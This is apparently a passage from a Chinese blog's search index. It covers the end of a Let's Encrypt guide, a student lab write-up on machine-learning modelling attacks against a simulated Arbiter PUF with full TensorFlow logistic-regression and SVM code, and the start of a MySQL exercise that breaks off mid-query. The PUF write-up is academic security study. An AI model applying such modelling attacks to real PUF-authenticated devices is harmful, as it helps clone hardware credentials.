renew`命令来更新证书，然后是在每周一上午3:40时重新加载Nginx，以使用更新的证书，命令生成的log将通过管道输出到/var/log/letsencrypt-renew.log日志文件。\n至此，网站就已经开使用免费的Let’s Encrypt TLS/SSL证书来安全地提供HTTPS内容。\n\n## 六、总结\n\n​\t一个好的第三方证书颁发机构还是很重要的。配置HTTPS也是运维必备的技能。还有很多证书颁发机构，以后如果做运维了再去深入研究。"},{"title":"基于机器学习的物理不可克隆函数(PUF)建模攻击","url":"/2018/04/26/puf-attack/","content":"\n## 一、机器学习\n\n​\t第一次接触机器学习，这个实验在做的过程中相当痛苦。在实验刚开始的很长一段时间内都没有建模的思路，而且机器学习也从来没有接触过。但是最后参考我们学校研究生学长的思路，还是将实验做出了最终正确的结果。\n\n​\t什么是机器学习？\n\n​\t1+1等于几 ?\n\t50\n\t笨，多了\n\n​\t1+2 等于几?\n\t20\n\t笨，多了\n\n​\t3+4 等于几?\n\t7\n\t真聪明，对了\n\n​\t6+9 等于几?\n\t13\n\t笨，少了\n\n​\t久而久之......\n\n​\t2+2 等于几? 4\n\n​\t4+5 等于几? 9\n\n​\t这就是机器学习，准确来说是最常见的一种，监督学习。最开始的几步是对于模型的训练，“多了”或“少了”可以理解为训练时的误差，模型根据误差调整自身参数，这就是机器学习里常用的反向传播(Backpropagation)的简单的解释。\n\n​\t在传统的利用计算机解决问题的途径中，我们通常是给定一个输入，通过施加一定的条件（或算法），最终得到一个输出结果。这也就是把通常的生活问题转化成一个计算问题，通过设计算法，来解决问题。如下图：\n\n![](https://ws2.sinaimg.cn/large/006tKfTcgy1fqps6pwlskj30k808s768.jpg)\n\n\n\n​\t但是有一类问题，人类是找不到这样的模式，来解决问题的。以 OCR 字符识别为例，输入是手写体(数字)图片，输出是 0-9 字符串，我们并不知道怎么把输入转换成输出，因为手写体因人而异，随机性很大。\n\n​\t换句话说，这个时候，我们缺的是知识(如何映射)，不过幸运的是，我们有(实例)数据。\n\n​\t而把这个知识通过机器(计算机)学出来的过程，叫做机器学习。这个学出来的知识(或经验)，可以用于新的输入，产生新的输出。如下图：\n\n![](https://ws2.sinaimg.cn/large/006tKfTcgy1fqps7nf79bj30jp0bon25.jpg)\n\n## 二、PUF以及建模攻击分析\n\n​\t物理不可克隆函数(Physical Unclonable Function，PUF)是一种新的轻量级硬件安全原语。当输入一个激励时，PUF 利用芯片制造过程中难以预测的工艺偏差(Process Variation)，输出依赖于芯片的不可克隆的响应，非常适合资源受限环境下的设备认证。然而，攻击者可以收集一定数量的激励响应对将 PUF 进行建模，因此，PUF 易受基于机器学习建模攻击。下图是一种典型的PUF——Arbiter PUF，其中{C1,C2,...,Cn-1,Cn}共同组成激励，r为响应。其原理是:一个脉冲信号 T 会在Arbiter PUF 上下两条路径同时传播，通过激励{C1,C2,...,Cn-1,Cn}改变路径(如 C1=1 时，在 M1 阶段交叉传播;C1=0 时，在 M1 阶段平行传播)，由于工艺偏差会影响不同路径的传播快慢，最终导致上下两条路径信号传播产生快慢差异，比较传播快慢生成激励响应r(0 或 1)。结构的示意图如下：\t\t\t\n\n![](https://ws4.sinaimg.cn/large/006tKfTcgy1fqpsix5lplj30l4089401.jpg)\n\n​\t我们假定示意图中的n为64，也就是我们组成激励为64位。下面我们来分析一下这个结构。一共64位的激励输入，也就是2^64种激励组合，在加上的最后一位的输出，组成了我们的数据集。\n\n​\t但是如果只把64位的01串和最后的一位01输出当做建模的结果的话，放进机器学习的算法中进行训练的话，不管数据集有多大，最后的测试结果正确率只能有50%左右，因为这样屏蔽了PUF内部的工作结构。因此我们的建模方式必须要考虑PUF内部的工作结构，能够把电流传播的路径考虑进去。\n\n## 三、逻辑回归与SVM\n\n​\t逻辑回归是这样的一个过程：面对一个回归或者分类问题，建立代价函数，然后通过优化方法迭代求解出最优的模型参数，然后测试验证我们这个求解的模型的好坏。Logistic回归虽然名字里带“回归”，但是它实际上是一种分类方法，主要用于两分类问题（即输出只有两种，分别代表两个类别）回归模型中，y是一个定性变量，比如y=0或1，logistic方法主要应用于研究某些事件发生的概率。\n\n​\tSVM（Support Vector Machines）——支持向量机是在所有知名的数据挖掘算法中最健壮，最准确的方法之一，它属于二分类算法，可以支持线性和非线性的分类。\n\n参考：\n\nhttps://blog.csdn.net/chibangyuxun/article/details/53148005\n\nhttps://zhuanlan.zhihu.com/p/28860065\n\n## 四、PUF建模\n\n​\t我们知道逻辑回归的公式是:\n\n![](https://ws3.sinaimg.cn/large/006tKfTcgy1fqpt92snn0j30ki01jdfv.jpg)\n\n​\t相对于线性回归，它在多了 sigmoid 函数(上图公式中的 g()函数)，g()的作用是使得 Y 的值保持在 0 到 1 之间，其表达式如下:\n\n![](https://ws1.sinaimg.cn/large/006tKfTcgy1fqpvaqtl2uj30l401rglm.jpg)\n\n​\t我们拥有简单的逻辑回归公式，是不是简单的将 Arbiter PUF 的输入激励当做逻辑回归的输入{x1,x2,...,xn }就行了呢?显然是不行的。\n\n​\t我们建模要符合 Arbiter PUF 实际的工作原理。举如下例子:\n\n![](https://ws4.sinaimg.cn/large/006tKfTcgy1fqpve047zrj30o20ahdh1.jpg)\n\n​\t如图，这是一个简单 4 阶 Arbiter PUF 对应激励(1011)的路径图，我们产生一位响应，只需要比较蓝红两条路径的信号传播快慢就行了。我们设逻辑回归的参数为{w0,w1,w2,w3,w4}，如果以(1011)作为输入，得到的结果为 w0+w1+w3+w4显然没有任何意义。\n\n​\t这时就需要变通了，我们需要在输入或者设参数上做点手脚来遵循 Arbiter-PUF 的工作原理。这里对 Arbiter PUF 的所有延迟段进行设参数。图中的(w11,w12,w13,w14)对应之前图中的(p,s,t,q)，这时我们产生响应相当于比较(w12+w24+w33+w42)和(w13+w21+w32+w43)的大小。即判断以下两个矩阵对应位置相乘后求和的正负。\n\n![](https://ws3.sinaimg.cn/large/006tKfTcgy1fqpvn0q51xj30lv0380t1.jpg)\n\n​\t可见激励(1011)和矩阵 C 是一一对应的，我们只需要对激励进行扩展就能完成建模。注意这里的矩阵相乘不是线性代数中的矩阵相乘，而是对应位置的数相乘。其实只要把矩阵做一下转置就可以对应线性代数中的矩阵相乘了。最终，我们把C矩阵编程一个1*256的矩阵，即把每行拼接起来，在编程进行计算做最后的一位01输出，我们的数据集手机方式就得以实现了。由于SVM算法的特性，我们需要把最后输出的0改为-1，以更方便来计算。\n\n​\t下面是各个路径对应的参数：\n\n```python\ndata = [194.606, 195.394, 196.01, 195.874, 194.794, 193.683, 192.148, 195.4, 194.362, 193.634, 195.452, 192.461, 194.52,\n        194.18, 194.802, 192.773, 194.291, 195.502, 195.698, 193.55, 196.461, 193.983, 196.106, 195.993, 195.995,\n        195.289, 194.944, 194.071, 196.365, 194.347, 194.936, 194.951, 196.044, 194.796, 195.777, 193.982, 196.579,\n        194.747, 196.359, 194.955, 196.574, 194.404, 194.944, 193.574, 195.21, 195.17, 193.35, 193.762, 193.704, 195.66,\n        194.801, 195.984, 195.22, 195.836, 195.341, 195.87, 196.222, 196.488, 194.434, 193.008, 194.658, 196.154,\n        194.116, 192.048,\n        194.615, 195.435, 196.026, 195.86, 194.767, 193.7, 192.157, 195.408, 194.414, 193.562, 195.477, 192.475,\n        194.526, 194.178, 194.732, 192.583, 194.308, 195.519, 195.74, 193.585, 196.455, 194.032, 196.068, 196.012,\n        196.055, 195.308, 194.953, 194.048, 196.423, 194.362, 194.977, 194.975, 196.081, 194.846, 195.799, 193.943,\n        196.653, 194.844, 196.344, 195.02, 196.567, 194.385, 195.002, 193.54, 195.605, 195.719, 193.845, 193.85,\n        193.702, 195.78, 194.8, 195.994, 195.06, 195.775, 195.308, 195.85, 196.388, 196.52, 194.348, 192.991, 194.688,\n        196.296, 194.132, 192.139,\n        194.643, 195.384, 195.969, 195.894, 194.776, 193.682, 192.129, 195.555, 194.426, 193.58, 195.446, 192.459,\n        194.55, 194.2, 194.764, 192.783, 194.282, 195.54, 195.736, 193.621, 196.422, 194.011, 196.165, 195.98, 196.046,\n        195.371, 194.909, 194.053, 196.373, 194.323, 194.997, 194.996, 196.169, 194.818, 195.829, 193.953, 196.678,\n        194.829, 196.411, 195.006, 196.552, 194.398, 194.999, 193.572, 195.651, 195.73, 193.907, 193.793, 193.698,\n        195.06, 194.838, 195.955, 195.053, 195.746, 195.359, 195.877, 196.354, 196.494, 194.449, 192.957, 194.704,\n        196.18, 194.108, 192.211,\n        194.558, 195.428, 196.014, 195.846, 194.833, 193.671, 192.1, 195.536, 194.341, 193.519, 195.585, 192.485,\n        194.518, 194.184, 194.829, 192.84, 194.295, 195.572, 195.657, 193.571, 196.464, 194.05, 196.063, 195.891,\n        196.012, 195.263, 194.978, 194.096, 196.328, 194.362, 194.92, 194.847, 196.08, 194.816, 195.736, 194.011,\n        196.631, 194.738, 196.345, 194.996, 196.57, 194.413, 194.859, 193.54, 195.33, 195.24, 193.17, 193.733, 193.693,\n        195.63, 194.807, 195.945, 195.65, 195.797, 195.355, 195.846, 196.234, 196.473, 194.456, 192.946, 194.744,\n        196.188, 194.09, 192.009]\n```\n\n​\t在实现过程中我们把数据导入到了csv文件中，并且把建模出来的数据导出到另外的csv文件中。\n\n## 五、逻辑回归建模攻击代码实现\n\n### 数据收集实现：\n\n```python\nimport tensorflow as tf\nimport csv\nimport random\nimport numpy as np\n\ndef shape(M):\n  return len(M), len(M[0])\n\nout1 = open('traindatasetin.csv','w')\nout2 = open('traindatasetout.csv','w')\ncsv_writer1 = csv.writer(out1)\ncsv_writer2 = csv.writer(out2)\ncsv_file = csv.reader(open('仿真Arbiter_PUF.csv','r'))\n\nPUFdelay_np = []\nPUFdelay = []\ndelay1 = 0\ndelay2 = 0\n\nfor i in csv_file:\n    PUFdelay.append(i)\n\nPUFdelay_np = np.array(PUFdelay, dtype=float)\n\nC_np = [([0] * 64) for i in range(4)]\nC_np_csv = []\nseed = \"01\"\ncounter1 = 0\n#counter0 = 0\ncounter = 0\n\nwhile counter != 2000:\n\tfor i in range(64):\n\t\tbinary = random.choice(seed)\n\t\tif binary == \"1\":\n\t\t\tdelaymiddle = delay2\n\t\t\tdelay2 = delay1\n\t\t\tdelay1 = delaymiddle\n\t\t\tdelay1 += float(PUFdelay[1][i])\n\t\t\tdelay2 += float(PUFdelay[2][i])\n\t\t\tC_np[0][i] = 0\n\t\t\tC_np[3][i] = 0\n\t\t\tcounter1 += 1\n\t\t\tif counter1 % 2 != 0:\n\t\t\t\tC_np[1][i] = 1\n\t\t\t\tC_np[2][i] = -1\n\t\t\tif counter1 % 2 == 0:\n\t\t\t\tC_np[1][i] = -1\n\t\t\t\tC_np[2][i] = 1\n\t\tif binary == \"0\":\n\t\t\tdelay1 += float(PUFdelay[0][i])\n\t\t\tdelay2 += float(PUFdelay[3][i])\n\t\t\tC_np[1][i] = 0\n\t\t\tC_np[2][i] = 0\n\t\t\t#counter0 += 1\n\t\t\tif counter1 % 2 != 0:\n\t\t\t\tC_np[0][i] = -1\n\t\t\t\tC_np[3][i] = 1\n\t\t\tif counter1 % 2 == 0:\n\t\t\t\tC_np[0][i] = 1\n\t\t\t\tC_np[3][i] = -1\n\tfor i in range(4):\n\t\tfor j in range(64):\n\t\t\tC_np_csv.append(C_np[i][j])\n\tcsv_writer1.writerow(C_np_csv)\n\tif counter1 % 2 == 0:\n\t\tif(delay1 > delay2):\n\t\t\tcsv_writer2.writerow(\"1\")\n\t\telse:\n\t\t\tcsv_writer2.writerow(\"0\")\n\telse:\n\t\tif(delay1 <= delay2):\n\t\t\tcsv_writer2.writerow(\"1\")\n\t\telse:\n\t\t\tcsv_writer2.writerow(\"0\")\n\tcounter1 = 0\n\tdelay1 = 0\n\tdelay2 = 0\n\tC_np_csv = []\n\tcounter += 1\n```\n\n### 逻辑回归建模攻击实现：\n\n```python\nfrom __future__ import print_function, division\nimport tensorflow as tf\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport random\nfrom sklearn.ensemble import RandomForestRegressor\nimport sklearn.preprocessing as preprocessing\nfrom numpy import array\nfrom sklearn.model_selection import train_test_split\n#tensorflow 实现 Logistic Regression\n#读取数据\nx_test = pd.read_csv(\"testdatasetin.csv\", header=None)  # 测试集特征\nx_train = pd.read_csv(\"traindatasetin.csv\", header=None)  # 训练集特征\ny_train = pd.read_csv(\"traindatasetout.csv\", header=None)  # 训练集标签\ny_test = pd.read_csv(\"testdatasetout.csv\", header=None)  # 测试集标签\n\ny_train = tf.concat([1 - y_train, y_train], 1)\ny_test = tf.concat([1 - y_test, y_test], 1)\n\n#参数定义\nlearning_rate = 0.05  # 学习率\ntraining_epochs = 300  # 训练迭代次数\nbatch_size = 100  # 分页的每页大小（后面训练采用了批量处理的方法）\ndisplay_step = 15  # 何时打印到屏幕的参量\n\nn_samples = x_train.shape[0]  # sample_num 训练样本数量\nn_features = x_train.shape[1]  # feature_num 特征数量 256\nn_class = 2\n#变量定义\nx = tf.placeholder(tf.float32, [None, n_features])\ny = tf.placeholder(tf.float32, [None, n_class])\n#权重定义\nW = tf.Variable(tf.zeros([n_features, n_class]), name=\"weight\")\nb = tf.Variable(tf.zeros([n_class]), name=\"bias\")\n\n#y=x*w+b 线性\npred = tf.matmul(x, W) + b\n\n#准确率\ncorrect_prediction = tf.equal(tf.argmax(pred, 1), tf.argmax(y, 1))\naccuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))\n\n#损失\ncost = tf.reduce_sum(\n    tf.nn.softmax_cross_entropy_with_logits(logits=pred, labels=y))\n#优化器\noptimizer = tf.train.GradientDescentOptimizer(learning_rate).minimize(cost)\n\n#初始化\ninit = tf.global_variables_initializer()\n\ntrain_accuracy = []\ntest_accuracy = []\navg_cost = []\n#训练\nwith tf.Session() as sess:\n        sess.run(init)\n        for epoch in range(training_epochs):\n            #avg_cost = 0\n            total_batch = int(n_samples / batch_size)\n            for i in range(total_batch):\n                _, c = sess.run([optimizer, cost],\n                                feed_dict={x: x_train[i * batch_size: (i + 1) * batch_size],\n                                           y: y_train[i * batch_size: (i + 1) * batch_size, :].eval()})\n\n                train_accuracy.append(accuracy.eval(\n                    {x: x_train, y: y_train.eval()}))\n                #ax2.plot(epoch+1, avg_cost, 'c.')\n                test_accuracy.append(accuracy.eval(\n                    {x: x_test, y: y_test.eval()}))\n                avg_cost.append(c / total_batch)\n            #plt.plot(epoch + 1, avg_cost, 'co')\n\n            if (epoch + 1) % display_step == 0:\n                print(\"Epoch:\", \"%04d\" % (epoch + 1), \"cost=\", c/total_batch)\n\n        print(\"Optimization Finished!\")\n        print(\"Testing Accuracy:\", accuracy.eval(\n            {x: x_test, y: y_test.eval()}))\n\n        plt.suptitle(\"learning rate=%f  training epochs=%i  sample_num=%i\" % (\n            learning_rate, training_epochs, n_samples), size=14)\n        plt.plot(avg_cost)\n        plt.plot(train_accuracy)\n        plt.plot(test_accuracy)\n        plt.legend(['loss', 'train_accuracy', 'test_accuracy'])\n        plt.ylim(0., 1.5)\n        #plt.savefig('AC8.png', dpi=300)\n        plt.xlabel(\"Epochs\")\n        plt.ylabel(\"Rate\")\n        plt.show()\n```\n\n最后的正确率可以达到98。\n\n# 六、SVM建模攻击代码实现\n\n### 数据收集实现：\n\n```python\nimport tensorflow as tf\nimport csv\nimport random\nimport numpy as np\n\ndef shape(M):\n  return len(M), len(M[0])\n\nout1 = open('testdatasetin.csv', 'w')\nout2 = open('testdatasetout.csv', 'w')\ncsv_writer1 = csv.writer(out1)\ncsv_writer2 = csv.writer(out2)\ncsv_file = csv.reader(open('仿真Arbiter_PUF.csv', 'r'))\n\nPUFdelay_np = []\nPUFdelay = []\ndelay1 = 0\ndelay2 = 0\n\nfor i in csv_file:\n    PUFdelay.append(i)\n\nPUFdelay_np = np.array(PUFdelay, dtype=float)\n\nC_np = [([0] * 64) for i in range(4)]\nC_np_csv = []\nseed = \"01\"\ncounter1 = 0\ncounter11 = 0\n#counter0 = 0\ncounter = 0\n\nwhile counter != 12500:\n\tfor i in range(64):\n\t\tbinary = random.choice(seed)\n\t\tif binary == \"1\":\n\t\t\tdelaymiddle = delay2\n\t\t\tdelay2 = delay1\n\t\t\tdelay1 = delaymiddle\n\t\t\tdelay1 += float(PUFdelay[1][i])\n\t\t\tdelay2 += float(PUFdelay[2][i])\n\t\t\tC_np[0][i] = 0\n\t\t\tC_np[3][i] = 0\n\t\t\tcounter1 += 1\n\t\t\tif counter1 % 2 != 0:\n\t\t\t\tC_np[1][i] = 1\n\t\t\t\tC_np[2][i] = -1\n\t\t\tif counter1 % 2 == 0:\n\t\t\t\tC_np[1][i] = -1\n\t\t\t\tC_np[2][i] = 1\n\t\tif binary == \"0\":\n\t\t\tdelay1 += float(PUFdelay[0][i])\n\t\t\tdelay2 += float(PUFdelay[3][i])\n\t\t\tC_np[1][i] = 0\n\t\t\tC_np[2][i] = 0\n\t\t\t#counter0 += 1\n\t\t\tif counter1 % 2 != 0:\n\t\t\t\tC_np[0][i] = -1\n\t\t\t\tC_np[3][i] = 1\n\t\t\tif counter1 % 2 == 0:\n\t\t\t\tC_np[0][i] = 1\n\t\t\t\tC_np[3][i] = -1\n\tfor i in range(4):\n\t\tfor j in range(64):\n\t\t\tC_np_csv.append(C_np[i][j])\n\tcsv_writer1.writerow(C_np_csv)\n\tif counter1 % 2 == 0:\n\t\tif(delay1 > delay2):\n\t\t\tcsv_writer2.writerow(\"1\")\n\t\telse:\n\t\t\trow = [-1]\n\t\t\tcsv_writer2.writerow(row)\n\telse:\n\t\tif(delay1 <= delay2):\n\t\t\tcsv_writer2.writerow(\"1\")\n\t\telse:\n\t\t\trow = [-1]\n\t\t\tcsv_writer2.writerow(row)\n\tcounter1 = 0\n\tdelay1 = 0\n\tdelay2 = 0\n\tC_np_csv = []\n\tcounter += 1\n```\n\n### SVM建模攻击实现：\n\n```python\n# -*- coding: utf-8 -*-\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport tensorflow as tf\nfrom sklearn import datasets\n\nfrom pylab import mpl\nmpl.rcParams['font.sans-serif'] = ['SimHei']\n\nnp.random.seed(1)\ntf.set_random_seed(1)\n\nsess = tf.Session()\n\n#产生数据\nx_vals = np.loadtxt(open(r\"testdatasetin.csv\", \"r\"), delimiter=\",\", skiprows=0)\ny_vals = np.loadtxt(open(r\"testdatasetout.csv\", \"r\"), delimiter=\",\", skiprows=0)\n\n#划分数据为训练集和测试集\ntrain_indices = np.random.choice(len(x_vals), round(len(x_vals)*0.8), replace=False)\ntest_indices = np.array(list(set(range(len(x_vals))) - set(train_indices)))\nx_vals_train = x_vals[train_indices]\nx_vals_test = x_vals[test_indices]\ny_vals_train = y_vals[train_indices]\ny_vals_test = y_vals[test_indices]\n#批训练中批的大小\nbatch_size = 100\n# 初始化feedin\nx_data = tf.placeholder(shape=[None, 256], dtype=tf.float32)\ny_target = tf.placeholder(shape=[None, 1], dtype=tf.float32)\n\n# 创建变量\nW = tf.Variable(tf.random_normal(shape=[256, 1]))\nb = tf.Variable(tf.random_normal(shape=[1, 1]))\n# 定义线性模型\nmodel_output = tf.matmul(x_data, W)+b\n# Declare vector L2 'norm' function squared\nl2_norm = tf.reduce_sum(tf.square(W))\n#软正则化参数\nalpha = tf.constant([0.02])\n#定义损失函数\nclassification_term = tf.reduce_mean(tf.maximum(0., 1.-model_output*y_target))\nloss = classification_term+alpha*l2_norm\n# classification_term = tf.reduce_mean(tf.maximum(0., tf.subtract(1., tf.multiply(model_output, y_target))))\n# loss = tf.add(classification_term, tf.multiply(alpha, l2_norm))\n#输出\nprediction = tf.sign(model_output)\naccuracy = tf.reduce_mean(tf.cast(tf.equal(prediction, y_target), tf.float32))\ntrain_step = tf.train.GradientDescentOptimizer(0.01).minimize(loss)\n#开始训练\nsess.run(tf.global_variables_initializer())\nloss_vec = []\ntrain_accuracy = []\ntest_accuracy = []\n\nfor i in range(2000):\n    rand_index = np.random.choice(len(x_vals_train), size=batch_size)\n    rand_x = x_vals_train[rand_index]\n    rand_y = np.transpose([y_vals_train[rand_index]])\n    sess.run(train_step, feed_dict={x_data: rand_x, y_target: rand_y})\n    temp_loss = sess.run(loss, feed_dict={x_data: rand_x, y_target: rand_y})\n    loss_vec.append(temp_loss)\n    train_acc_temp = sess.run(accuracy, feed_dict={\n                              x_data: x_vals_train, y_target: np.transpose([y_vals_train])})\n    train_accuracy.append(train_acc_temp)\n    test_acc_temp = sess.run(accuracy, feed_dict={\n                             x_data: x_vals_test, y_target: np.transpose([y_vals_test])})\n    test_accuracy.append(test_acc_temp)\n    if (i+1) % 100 == 0:\n        print('Step #' + str(i+1) + ' W = ' +\n              str(sess.run(W)) + 'b = ' + str(sess.run(b)))\n        print('Loss = ' + str(test_acc_temp))  # test_acc_temp\nplt.plot(loss_vec)\nplt.plot(train_accuracy)\nplt.plot(test_accuracy)\nplt.legend(['损失', '训练精确度', '测试精确度'])\nplt.ylim(0., 1.)\nplt.show()\n```\n\n最后的正确率会达到至少97.5%以上。\n\n由于个人精力有限，不再分析tensorflow开源机器学习神器和内部算法实现。\n\n​\t\t\n​\t\n\n\n\n​\t\t\t\n​\t\t\n​\t\n\n​\t\t\t\t\n​\t\t\n​\t"},{"title":"SQL练习","url":"/2018/04/19/SQL练习/","content":"\n# 实验：数据查询-MySQL\n\n## **一、实验目的**\n\nl  了解MySQL查询编辑器的启动，熟悉如何在MySQL查询编辑器中查询记录。\n\nl  掌握SELECT语句的基本语法和查询条件表示方法。\n\nl  掌握GROUP BY 和ORDER BY 子句的作用和使用方法。\n\nl  掌握连接查询和子查询的使用方法。\n\nl  掌握复杂查询的使用方法。\n\n## **二、实验任务**\n\n### 1．新建一个数据库HRM，并在数据库HRM中，建立如下所示的三个表：\n\nEmployee表\n\n| 列名         | 数据类型 | 长度 | 是否允许为空 | 说明             |\n| ------------ | -------- | ---- | ------------ | ---------------- |\n| EmployeeID   | Char     | 6    | 否           | 员工编号，主键   |\n| Name         | Char     | 10   | 否           | 姓名             |\n| Birthday     | Datetime | 8    | 否           | 出生日期         |\n| Sex          | Bit      | 1    | 否           | 性别             |\n| Address      | Char     | 20   | 是           | 家庭地址         |\n| Zip          | Char     | 6    | 是           | 邮编             |\n| PhoneNumber  | Char     | 12   | 是           | 电话号码         |\n| EmailAddress | Char     | 30   | 是           | 电子邮件地址     |\n| DepartmentID | Char     | 3    | 否           | 员工部门号，外键 |\n\nDepartments表\n\n| 列名           | 数据类型 | 长度 | 是否允许为空 | 说明             |\n| -------------- | -------- | ---- | ------------ | ---------------- |\n| DepartmentID   | Char     | 3    | 否           | 员工部门号，主键 |\n| DepartmentName | Char     | 20   | 否           | 部门名           |\n| Note           | Text     | 16   | 是           | 备注             |\n\nSalary表\n\n| 列名       | 数据类型 | 长度 | 是否允许为空 | 说明           |\n| ---------- | -------- | ---- | ------------ | -------------- |\n| EmployeeID | Char     | 6    | 否           | 员工编号，外键 |\n| Income     | Float    | 8    | 否           | 收入           |\n| OutCome    | Float    | 8    | 否           | 支出           |\n\n \n\n### 2．对上节建立的表输入数据：\n\nDepartments表：\n\n| DepartmentID | DepartmentName | Note       |\n| ------------ | -------------- | ---------- |\n| 1            | 财务部         | 财务部     |\n| 2            | 研发部         | 研发部     |\n| 3            | 人力资源部     | 人力资源部 |\n\nEmployee表\n\n| EmployeeID | Name | Birthday | Sex  | Address  | Zip    | PhoneNumber | EmailAddress   | DepartmentID |\n| ---------- | ---- | -------- | ---- | -------- | ------ | ----------- | -------------- | ------------ |\n| 1001       | 李勇 | 78-3-12  | 0    | 湖南岳阳 | 475001 | 3880378     | ly@henu.edu.cn | 1            |\n| 1002       | 王敏 | 80-11-2  | 1    | 湖南衡阳 | 475002 | 0378311     | wm@henu.edu.cn | 1            |\n| 1003       | 刘晨 | 78-6-22  | 0    | 湖南娄底 | 475003 | 0378322     | lc@henu.edu.cn | 1            |\n| 2001       | 张立 | 78-8-1   | 0    | 湖南长沙 | 475004 | 0378333     | zl@henu.edu.cn | 2            |\n| 2002       | 刘毅 | 82-1-23  | 0    | 湖南岳阳 | 475005 | 0378344     | ly@henu.edu.cn | 2            |\n| 2003       | 张玫 | 81-3-15  | 1    | 湖南邵阳 | 475006 | 0378355     | zm@henu.edu.cn | 2            |\n| 3001       | 徐静 | 76-8-12  | 1    | 河南洛阳 | 475007 | 0378366     | xj@henu.edu.cn | 3            |\n| 3002       | 赵军 | 79-2-19  | 0    | 湖南岳阳 | 475008 | 0378377     | zj@henu.edu.cn | 3            |\n\nSalary表\n\n| EmployeeID | Income | OutCome |\n| ---------- | ------ | ------- |\n| 1001       | 3600   | 1500    |\n| 1002       | 3300   | 1000    |\n| 1003       | 3700   | 1200    |\n| 2001       | 4000   | 1600    |\n| 2002       | 3800   | 1800    |\n| 2003       | 3800   | 1500    |\n| 3001       | 4200   | 2000    |\n| 3002       | 4100   | 1800    |\n\n```sql\nSET NAMES utf8;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for Departments\n-- ----------------------------\nDROP TABLE IF EXISTS `Departments`;\nCREATE TABLE `Departments` (\n  `DepartmentID` char(3) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工部门号，主键',\n  `DepartmentName` char(20) COLLATE utf8_unicode_ci NOT NULL COMMENT '部门名',\n  `Note` text COLLATE utf8_unicode_ci COMMENT '备注',\n  PRIMARY KEY (`DepartmentID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;\n\n-- ----------------------------\n-- Records of Departments\n-- ----------------------------\nBEGIN;\nINSERT INTO `Departments` VALUES ('1', '财务部', '财务部');\nINSERT INTO `Departments` VALUES ('2', '研发部', '研发部');\nINSERT INTO `Departments` VALUES ('3', '人力资源部', '人力资源部');\nCOMMIT;\n\n-- ----------------------------\n-- Table structure for Employee\n-- ----------------------------\nDROP TABLE IF EXISTS `Employee`;\nCREATE TABLE `Employee` (\n  `EmployeeID` char(6) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工编号，主键',\n  `Name` char(10) COLLATE utf8_unicode_ci NOT NULL COMMENT '姓名',\n  `Birthday` datetime(6) NOT NULL COMMENT '出生日期',\n  `Sex` int(2) NOT NULL COMMENT '性别',\n  `Address` char(20) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '家庭地址',\n  `Zip` char(6) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '邮编',\n  `PhoneNumber` char(12) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '电话号码',\n  `EmailAddress` char(30) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '电子邮件地址',\n  `DepartmentID` char(3) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工部门号，外键',\n  PRIMARY KEY (`EmployeeID`),\n  KEY `foreign_key1` (`DepartmentID`),\n  CONSTRAINT `foreign_key1` FOREIGN KEY (`DepartmentID`) REFERENCES `Departments` (`DepartmentID`) ON DELETE NO ACTION ON UPDATE CASCADE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;\n\n-- ----------------------------\n-- Records of Employee\n-- ----------------------------\nBEGIN;\nINSERT INTO `Employee` VALUES ('1001', '李勇', '1978-03-12 00:00:00.000000', 0, '湖南岳阳', '475001', '3880378', 'ly@henu.edu.cn', '1');\nINSERT INTO `Employee` VALUES ('1002', '王敏', '1980-11-02 00:00:00.000000', 1, '湖南衡阳', '475002', '378311', 'wm@henu.edu.cn', '1');\nINSERT INTO `Employee` VALUES ('1003', '刘晨', '1978-06-22 00:00:00.000000', 0, '湖南娄底', '475003', '378322', 'lc@henu.edu.cn', '1');\nINSERT INTO `Employee` VALUES ('2001', '张立', '1978-08-01 00:00:00.000000', 0, '湖南长沙', '475004', '378333', 'zl@henu.edu.cn', '2');\nINSERT INTO `Employee` VALUES ('2002', '刘毅', '1982-01-23 00:00:00.000000', 0, '湖南岳阳', '475005', '378344', 'ly@henu.edu.cn', '2');\nINSERT INTO `Employee` VALUES ('2003', '张玫', '1981-03-15 00:00:00.000000', 1, '湖南邵阳', '475006', '378355', 'zm@henu.edu.cn', '2');\nINSERT INTO `Employee` VALUES ('3001', '徐静', '1976-08-12 00:00:00.000000', 1, '河南洛阳', '475007', '378366', 'xj@henu.edu.cn', '3');\nINSERT INTO `Employee` VALUES ('3002', '赵军', '1979-02-19 00:00:00.000000', 0, '湖南岳阳', '475008', '378377', 'zj@henu.edu.cn', '3');\nCOMMIT;\n\n-- ----------------------------\n-- Table structure for Salary\n-- ----------------------------\nDROP TABLE IF EXISTS `Salary`;\nCREATE TABLE `Salary` (\n  `EmployeeID` char(6) COLLATE utf8_unicode_ci NOT NULL COMMENT '员工编号，外键',\n  `Income` float(8,0) NOT NULL COMMENT '收入',\n  `OutCome` float(8,0) NOT NULL COMMENT '支出\\n',\n  KEY `foreign_key2` (`EmployeeID`),\n  CONSTRAINT `foreign_key2` FOREIGN KEY (`EmployeeID`) REFERENCES `Employee` (`EmployeeID`) ON DELETE NO ACTION ON UPDATE CASCADE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;\n\n-- ----------------------------\n-- Records of Salary\n-- ----------------------------\nBEGIN;\nINSERT INTO `Salary` VALUES ('1001', 3600, 1500);\nINSERT INTO `Salary` VALUES ('1002', 3300, 1000);\nINSERT INTO `Salary` VALUES ('1003', 3700, 1200);\nINSERT INTO `Salary` VALUES ('2001', 4000, 1600);\nINSERT INTO `Salary` VALUES ('2002', 3800, 1800);\nINSERT INTO `Salary` VALUES ('2003', 3800, 1500);\nINSERT INTO `Salary` VALUES ('3001', 4200, 2000);\nINSERT INTO `Salary` VALUES ('3002', 4100, 1800);\nCOMMIT;\n```\n\n \n\n### 3. 练习下面简单的查询语句：\n\n1) 查询每个雇员的所有信息\n\n```sql\nselect * from 